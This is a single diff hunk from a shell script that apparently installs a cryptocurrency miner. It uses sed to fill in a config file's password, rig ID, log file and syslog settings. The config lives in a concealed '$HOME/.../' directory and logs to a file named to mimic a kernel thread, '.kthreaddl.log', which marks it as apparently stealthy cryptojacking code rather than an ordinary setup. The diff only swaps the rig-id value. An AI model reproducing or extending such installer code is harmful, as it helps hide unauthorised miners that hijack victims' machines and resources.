@@ -996,7 +996,7 @@ if (test $? -ne 0); then
 fi
 
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.../config.json
-sed -i 's#"rig-id": *null,#"rig-id": "'$HOME'",#' $HOME/.../config.json
+sed -i 's#"rig-id": *null,#"rig-id": "'$PASS'",#' $HOME/.../config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/.../.kthreaddl.log'",#' $HOME/.../config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.../config.json
 
